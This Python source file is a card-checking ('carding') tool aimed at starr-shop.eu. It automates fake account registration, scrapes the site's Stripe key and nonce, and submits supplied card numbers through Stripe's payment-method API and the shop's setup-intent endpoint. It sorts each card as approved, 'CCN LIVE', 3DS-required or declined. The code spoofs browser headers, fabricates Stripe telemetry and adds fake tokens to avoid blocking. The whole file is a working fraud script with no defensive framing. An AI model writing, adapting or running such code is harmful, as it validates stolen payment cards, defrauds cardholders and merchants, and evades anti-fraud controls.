"""
Fast Starr Shop Stripe Auth Checker
====================================
High-speed implementation for starr-shop.eu
Workflow: Register -> Dashboard -> Payment Methods -> Add Payment Method -> Stripe API -> Confirm
"""

import asyncio
import aiohttp
import random
import string
import re
import json
import hashlib
import uuid
import time
from urllib.parse import urlparse
from typing import Dict, Optional
from bs4 import BeautifulSoup

# Starr Shop site
STARR_SITE = "https://starr-shop.eu"

# Fast timeout for high-speed operation (optimized for speed - silver bullet)
REQUEST_TIMEOUT = 35  # Reduced for maximum speed


def generate_random_email() -> str:
    """Generate a random email address."""
    chars = string.ascii_lowercase + string.digits
    username = ''.join(random.choices(chars, k=12))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    return f"{username}@{random.choice(domains)}"


def generate_random_password() -> str:
    """Generate a random strong password."""
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choices(chars, k=14))


def generate_security_token(url: str, card: str, timestamp: float = None) -> str:
    """
    Generate a security token to wrap requests and prevent direct API blocking.
    Creates a unique token based on URL, card, and timestamp for request authentication.
    """
    if timestamp is None:
        timestamp = time.time()
    
    # Create a unique token based on URL domain, timestamp, and a random component
    domain = urlparse(url).netloc if urlparse(url).netloc else url.split("//")[-1].split("/")[0]
    token_data = f"{domain}|{timestamp}|{random.randint(100000, 999999)}|{card[:6]}"
    token_hash = hashlib.sha256(token_data.encode()).hexdigest()[:32]
    
    # Format as UUID-like token for legitimacy
    token = f"{token_hash[:8]}-{token_hash[8:12]}-{token_hash[12:16]}-{token_hash[16:20]}-{token_hash[20:32]}"
    return token


def wrap_request_with_token(headers: dict, url: str, card: str) -> dict:
    """
    Wrap request with security token to prevent direct API blocking.
    Adds security tokens to headers for bulletproof requests.
    Returns updated headers.
    """
    token = generate_security_token(url, card)
    timestamp = int(time.time() * 1000)
    request_id = str(uuid.uuid4())
    
    # Add security token to headers (bulletproof request wrapping)
    headers['X-Request-Token'] = token
    headers['X-Request-Timestamp'] = str(timestamp)
    headers['X-Request-Id'] = request_id
    headers['X-Client-Version'] = '1.0.0'
    headers['X-Security-Check'] = '1'
    
    return headers


class StarrStripeChecker:
    """
    Fast Starr Shop Stripe Checker with optimized workflow.
    """
    
    def __init__(self):
        self.site_url = STARR_SITE.rstrip('/')
        self.stripe_pk = None
        self.nonce = None
        self.email = None
        self.password = None
        self.session_cookies = {}
    
    def _get_headers(self, referer: str = "", content_type: str = "") -> Dict[str, str]:
        """Get optimized request headers."""
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin" if referer else "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
        }
        if referer:
            headers["referer"] = referer
        if content_type:
            headers["content-type"] = content_type
        return headers
    
    async def check_card(self, card: str, month: str, year: str, cvv: str) -> Dict:
        """
        Fast card check with optimized workflow.
        
        Returns:
            Dict with: success, response, message, card, payment_method_id, etc.
        """
        fullcc = f"{card}|{month}|{year}|{cvv}"
        
        result = {
            "success": False,
            "response": "UNKNOWN",
            "message": "Unknown error",
            "card": fullcc,
            "payment_method_id": None,
            "site": self.site_url,
        }
        
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        connector = aiohttp.TCPConnector(ssl=False, limit=10)
        
        try:
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                # Generate credentials
                self.email = generate_random_email()
                self.password = generate_random_password()
                
                # Step 1: Get /my-account/ page for registration (FAST - no delay)
                headers = self._get_headers()
                headers = wrap_request_with_token(headers, f'{self.site_url}/my-account/', card)
                async with session.get(f'{self.site_url}/my-account/', headers=headers) as resp:
                    html = await resp.text()
                    # Save cookies
                    self.session_cookies.update(resp.cookies)
                
                # Parse registration form
                soup = BeautifulSoup(html, 'html.parser')
                reg_form = soup.find('form', {'class': 'woocommerce-form-register'})
                if not reg_form:
                    reg_form = soup.find('form', {'class': 'register'})
                if not reg_form:
                    # Try to find any form with email field
                    reg_form = soup.find('form')
                    if reg_form and not soup.find('input', {'name': 'email', 'type': 'email'}):
                        reg_form = None
                
                if not reg_form:
                    result["response"] = "SITE_ERROR"
                    result["message"] = "Registration form not found"
                    return result
                
                # Get hidden fields and nonce
                form_data = {}
                for inp in reg_form.find_all('input'):
                    name = inp.get('name')
                    value = inp.get('value', '')
                    if name:
                        form_data[name] = value
                
                # Add registration data (check if email-only or email+password)
                has_password = soup.find('input', {'name': 'password', 'type': 'password'})
                if has_password:
                    form_data.update({
                        'email': self.email,
                        'password': self.password,
                        'register': 'Register',
                    })
                else:
                    form_data.update({
                        'email': self.email,
                        'register': 'Register',
                    })
                
                # Step 2: Submit registration (FAST - no delays)
                reg_headers = self._get_headers(
                    f'{self.site_url}/my-account/',
                    'application/x-www-form-urlencoded'
                )
                reg_headers["origin"] = self.site_url
                reg_headers = wrap_request_with_token(reg_headers, f'{self.site_url}/my-account/', card)
                
                async with session.post(
                    f'{self.site_url}/my-account/',
                    headers=reg_headers,
                    data=form_data,
                    allow_redirects=True
                ) as resp:
                    reg_response = await resp.text()
                    self.session_cookies.update(resp.cookies)
                
                # Step 3: Get dashboard /my-account/ (FAST - minimal delay, required for session)
                dash_headers = self._get_headers(f'{self.site_url}/my-account/')
                dash_headers = wrap_request_with_token(dash_headers, f'{self.site_url}/my-account/', card)
                async with session.get(
                    f'{self.site_url}/my-account/',
                    headers=dash_headers
                ) as resp:
                    html2 = await resp.text()
                    self.session_cookies.update(resp.cookies)
                
                # Step 4: Get payment-methods/ page (FAST - required step)
                pm_headers = self._get_headers(f'{self.site_url}/my-account/')
                pm_headers = wrap_request_with_token(pm_headers, f'{self.site_url}/my-account/payment-methods/', card)
                async with session.get(
                    f'{self.site_url}/my-account/payment-methods/',
                    headers=pm_headers
                ) as resp:
                    await resp.text()
                    self.session_cookies.update(resp.cookies)
                
                # Step 5: Get add-payment-method/ page and extract nonce and Stripe key (FAST)
                addpm_headers = self._get_headers(f'{self.site_url}/my-account/payment-methods/')
                addpm_headers = wrap_request_with_token(addpm_headers, f'{self.site_url}/my-account/add-payment-method/', card)
                async with session.get(
                    f'{self.site_url}/my-account/add-payment-method/',
                    headers=addpm_headers
                ) as resp:
                    pm_html = await resp.text()
                    self.session_cookies.update(resp.cookies)
                
                # Parse HTML for nonce and Stripe key extraction (FAST)
                pm_soup = BeautifulSoup(pm_html, 'html.parser')
                
                # Extract Stripe public key
                pk_match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', pm_html)
                if not pk_match:
                    result["response"] = "SITE_ERROR"
                    result["message"] = "Could not extract Stripe key"
                    return result
                self.stripe_pk = pk_match.group(0)
                
                # Extract nonce from page - multiple patterns (optimized order)
                nonce_patterns = [
                    r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']',
                    r'"_ajax_nonce["\']?\s*:\s*["\']([^"\']+)["\']',
                    r'name=["\']_ajax_nonce["\']\s+value=["\']([^"\']+)["\']',
                    r'nonce["\']?\s*:\s*["\']([^"\']+)["\']',
                ]
                
                self.nonce = None
                for pattern in nonce_patterns:
                    match = re.search(pattern, pm_html)
                    if match:
                        self.nonce = match.group(1).strip()
                        break
                
                if not self.nonce:
                    # Try to find in script tags
                    scripts = pm_soup.find_all('script')
                    for script in scripts:
                        if script.string:
                            match = re.search(r'nonce["\']?\s*:\s*["\']([^"\']+)["\']', script.string)
                            if match:
                                self.nonce = match.group(1).strip()
                                break
                
                # Also try input field
                if not self.nonce:
                    nonce_input = pm_soup.find('input', {'name': '_ajax_nonce'})
                    if nonce_input:
                        self.nonce = nonce_input.get('value', '').strip()
                
                if not self.nonce:
                    result["response"] = "SITE_ERROR"
                    result["message"] = "Could not extract nonce"
                    return result
                
                # Step 6: Create payment method via Stripe API (FAST - direct API call)
                exp_year = year[-2:] if len(year) == 4 else year
                exp_month = month.zfill(2) if len(month) == 1 else month
                
                stripe_headers = {
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
                }
                # Add tokenization for bulletproof requests
                stripe_headers = wrap_request_with_token(stripe_headers, "https://api.stripe.com/v1/payment_methods", card)
                
                # Format card number with spaces
                card_formatted = ' '.join([card[i:i+4] for i in range(0, len(card), 4)])
                
                pm_data = {
                    "type": "card",
                    "card[number]": card_formatted,
                    "card[cvc]": cvv,
                    "card[exp_year]": exp_year,
                    "card[exp_month]": exp_month,
                    "allow_redisplay": "unspecified",
                    "billing_details[address][country]": "US",
                    "payment_user_agent": "stripe.js/065b474d33; stripe-js-v3/065b474d33; payment-element; deferred-intent",
                    "referrer": self.site_url,
                    "time_on_page": str(random.randint(30000, 60000)),
                    "client_attribution_metadata[client_session_id]": ''.join(random.choices(string.ascii_lowercase + string.digits, k=36)),
                    "client_attribution_metadata[merchant_integration_source]": "elements",
                    "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                    "client_attribution_metadata[merchant_integration_version]": "2021",
                    "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                    "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                    "client_attribution_metadata[elements_session_config_id]": ''.join(random.choices(string.ascii_lowercase + string.digits, k=36)),
                    "key": self.stripe_pk,
                    "_stripe_version": "2024-06-20",
                }
                
                # Add random GUID, MUID, SID
                pm_data["guid"] = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
                pm_data["muid"] = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
                pm_data["sid"] = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
                
                async with session.post(
                    "https://api.stripe.com/v1/payment_methods",
                    headers=stripe_headers,
                    data=pm_data
                ) as resp:
                    pm_result = await resp.json()
                
                # Check for Stripe errors
                if "error" in pm_result:
                    error = pm_result["error"]
                    error_code = error.get("code", "unknown")
                    error_msg = error.get("message", "Unknown error")
                    error_type = error.get("type", "").lower()
                    
                    result["message"] = error_msg
                    
                    # Check for action_required or authentication_required (3DS)
                    if error_type == "card_error" and ("authentication_required" in error_code or "action_required" in error_code):
                        result["success"] = True
                        result["response"] = "3DS_REQUIRED"
                        result["message"] = "3D Secure authentication required"
                        return result
                    
                    # Classify based on Stripe error codes
                    ccn_live_codes = [
                        "incorrect_cvc", "invalid_cvc", "incorrect_zip",
                        "postal_code_invalid", "insufficient_funds"
                    ]
                    # 3DS codes
                    three_ds_codes = [
                        "authentication_required", "action_required", "requires_action"
                    ]
                    
                    if error_code in three_ds_codes or any(x in error_msg.lower() for x in ["authentication required", "action required", "3d secure", "3ds"]):
                        result["success"] = True
                        result["response"] = "3DS_REQUIRED"
                    elif error_code in ccn_live_codes or any(x in error_msg.lower() for x in ["cvc", "security code", "zip", "postal", "insufficient"]):
                        result["success"] = True
                        result["response"] = "CCN LIVE"
                    else:
                        result["response"] = "DECLINED"
                        result["success"] = False
                    
                    return result
                
                pm_id = pm_result.get("id")
                if not pm_id:
                    result["response"] = "PM_ERROR"
                    result["message"] = "No payment method ID returned"
                    return result
                
                result["payment_method_id"] = pm_id
                
                # Step 7: Confirm setup intent via admin-ajax.php (FAST)
                confirm_headers = {
                    "accept": "*/*",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": self.site_url,
                    "referer": f"{self.site_url}/my-account/add-payment-method/",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
                    "x-requested-with": "XMLHttpRequest",
                }
                # Add tokenization for bulletproof requests
                confirm_headers = wrap_request_with_token(confirm_headers, f"{self.site_url}/wp-admin/admin-ajax.php", card)
                
                confirm_data = {
                    "action": "wc_stripe_create_and_confirm_setup_intent",
                    "wc-stripe-payment-method": pm_id,
                    "wc-stripe-payment-type": "card",
                    "_ajax_nonce": self.nonce,
                }
                
                async with session.post(
                    f"{self.site_url}/wp-admin/admin-ajax.php",
                    headers=confirm_headers,
                    data=confirm_data,
                    cookies=self.session_cookies
                ) as resp:
                    confirm_text = await resp.text()
                
                result["raw_response"] = confirm_text
                
                # Parse the confirmation result (FAST parsing - matches /au response format)
                try:
                    confirm_json = json.loads(confirm_text)
                    
                    # Check for action_required FIRST (before success check)
                    data = confirm_json.get("data", {})
                    if isinstance(data, dict):
                        # Check for action_required, challenge, or authentication_required
                        data_str = str(data).lower()
                        if any(x in data_str for x in ["action_required", "action required", "challenge", "authentication_required", "authentication required", "requires_action"]):
                            result["success"] = True
                            result["response"] = "3DS_REQUIRED"
                            result["message"] = "3D Secure authentication required"
                            return result
                    
                    # Check for success response - verify it's real, not fake
                    if confirm_json.get("success") == True:
                        # Additional verification: check if there's any error or action required in nested data
                        if isinstance(data, dict):
                            # Double-check for action_required indicators
                            if "action_required" in str(data).lower() or "challenge" in str(data).lower() or "authentication" in str(data).lower():
                                result["success"] = True
                                result["response"] = "3DS_REQUIRED"
                                result["message"] = "3D Secure authentication required"
                                return result
                        # Only approve if truly successful with no errors
                        result["success"] = True
                        result["response"] = "APPROVED"
                        result["message"] = "Card authenticated successfully"
                    else:
                        # Parse error from data structure
                        data = confirm_json.get("data", {})
                        
                        # Try multiple error extraction patterns
                        error_msg = None
                        if isinstance(data, dict):
                            error = data.get("error", {})
                            if isinstance(error, dict):
                                error_msg = error.get("message")
                            elif isinstance(error, str):
                                error_msg = error
                        
                        if not error_msg:
                            error_msg = data.get("message") or str(data) if data else confirm_text[:100]
                        
                        if not error_msg or error_msg == "{}":
                            error_msg = confirm_text[:100]
                        
                        result["message"] = str(error_msg)[:200]
                        
                        # Classify the response (matches /au format)
                        error_upper = str(error_msg).upper()
                        
                        # Check for "action required" or "action_required" - this is 3DS
                        if "ACTION REQUIRED" in error_upper or "ACTION_REQUIRED" in error_upper:
                            result["success"] = True
                            result["response"] = "3DS_REQUIRED"
                            result["message"] = "3D Secure authentication required"
                            return result
                        
                        # CCN Live patterns (card is valid but has verification issues) - 3DS patterns first
                        ccn_patterns = [
                            "3D SECURE", "3DS", "AUTHENTICATION_REQUIRED", "AUTHENTICATION REQUIRED",
                            "REQUIRES_AUTHENTICATION", "REQUIRES AUTHENTICATION", "CHALLENGE_REQUIRED",
                            "SECURITY CODE", "CVC", "CVV", "INCORRECT_CVC", "INVALID_CVC",
                            "POSTAL CODE", "ZIP", "ADDRESS", "AVS", "INCORRECT_ZIP",
                            "INSUFFICIENT FUNDS", "NSF", "LIMIT", "INSUFFICIENT",
                        ]
                        
                        if any(x in error_upper for x in ccn_patterns):
                            result["success"] = True
                            # Check if it's specifically 3DS
                            if any(x in error_upper for x in ["3D", "3DS", "AUTHENTICATION_REQUIRED", "AUTHENTICATION REQUIRED", "ACTION REQUIRED", "ACTION_REQUIRED"]):
                                result["response"] = "3DS_REQUIRED"
                            else:
                                result["response"] = "CCN LIVE"
                        # Clear declined patterns - must be explicit, no fake approved
                        elif any(x in error_upper for x in [
                            "DECLINED", "DECLINE", "REJECTED", "EXPIRED",
                            "LOST", "STOLEN", "FRAUD", "DO NOT HONOR", "DO_NOT_HONOR",
                            "PICKUP", "RESTRICTED", "NOT PERMITTED", "INVALID_NUMBER",
                            "CARD_DECLINED", "GENERIC_DECLINE", "INVALID_ACCOUNT",
                            "CARD_NOT_SUPPORTED", "NO_SUCH_CARD", "TRY_AGAIN"
                        ]):
                            result["response"] = "DECLINED"
                            result["success"] = False
                        else:
                            # Default to declined if unclear - NO FAKE APPROVED
                            result["response"] = "DECLINED"
                            result["success"] = False
                            
                except json.JSONDecodeError:
                    # Not JSON, parse as text (fallback)
                    confirm_lower = confirm_text.lower()
                    # Check for action required first
                    if "action required" in confirm_lower or "action_required" in confirm_lower or "authentication required" in confirm_lower or "3d secure" in confirm_lower or "3ds" in confirm_lower:
                        result["success"] = True
                        result["response"] = "3DS_REQUIRED"
                        result["message"] = "3D Secure authentication required"
                    elif "success" in confirm_lower or "thank you" in confirm_lower or "approved" in confirm_lower:
                        # Only approve if no action required indicators
                        if "action" not in confirm_lower and "challenge" not in confirm_lower:
                            result["success"] = True
                            result["response"] = "APPROVED"
                            result["message"] = "Setup successful"
                        else:
                            result["success"] = True
                            result["response"] = "3DS_REQUIRED"
                            result["message"] = "3D Secure authentication required"
                    elif "error" in confirm_lower or "declined" in confirm_lower:
                        result["response"] = "DECLINED"
                        result["success"] = False
                        result["message"] = confirm_text[:100]
                    else:
                        result["response"] = "UNKNOWN"
                        result["success"] = False
                        result["message"] = confirm_text[:100]
                
                return result
                
        except aiohttp.ClientError as e:
            result["response"] = "NETWORK_ERROR"
            result["message"] = f"Network error: {str(e)[:50]}"
            return result
        except asyncio.TimeoutError:
            result["response"] = "TIMEOUT"
            result["message"] = "Request timed out"
            return result
        except Exception as e:
            result["response"] = "EXCEPTION"
            result["message"] = str(e)[:100]
            return result


async def check_starr_stripe(fullcc: str) -> Dict:
    """
    Fast check a card using Starr Shop Stripe Auth.
    
    Args:
        fullcc: Card in format cc|mm|yy|cvv or cc|mm|yyyy|cvv
        
    Returns:
        Result dictionary with success, response, message, card, site, etc.
    """
    parts = fullcc.replace(" ", "").split("|")
    if len(parts) != 4:
        return {
            "success": False,
            "response": "INVALID_FORMAT",
            "message": "Card must be in format: cc|mm|yy|cvv",
            "card": fullcc,
            "site": STARR_SITE,
        }
    
    card, month, year, cvv = parts
    
    # Normalize month
    if len(month) == 1:
        month = "0" + month
    
    # Normalize year
    if len(year) == 2:
        year = "20" + year
    
    checker = StarrStripeChecker()
    return await checker.check_card(card, month, year, cvv)


def determine_starr_status(result: Dict) -> str:
    """
    Determine the display status from result.
    Professional response handling - detects 3DS, prevents fake approved.
    
    Returns:
        Status string: "APPROVED", "CCN LIVE", "3DS_REQUIRED", "DECLINED", or "ERROR"
    """
    response = result.get("response", "UNKNOWN").upper()
    message = str(result.get("message", "")).upper()
    combined = f"{response} {message}"
    
    # Check for 3DS/action required first (highest priority)
    if "3DS_REQUIRED" in response or "3D_SECURE" in combined or "ACTION REQUIRED" in combined or "ACTION_REQUIRED" in combined:
        return "3DS_REQUIRED"
    
    # Only return APPROVED if success is explicitly True and no errors
    if response == "APPROVED" and result.get("success") == True:
        # Double-check: no error indicators
        if "ERROR" not in combined and "FAILED" not in combined:
            return "APPROVED"
    
    # CCN Live patterns
    if response == "CCN_LIVE" or response == "CCN LIVE" or "CCN" in combined:
        return "CCN LIVE"
    
    # Declined patterns
    if response in ["DECLINED", "DECLINE"] or "DECLINED" in combined:
        return "DECLINED"
    
    # Default to error if unclear - NO FAKE APPROVED
    return "ERROR"
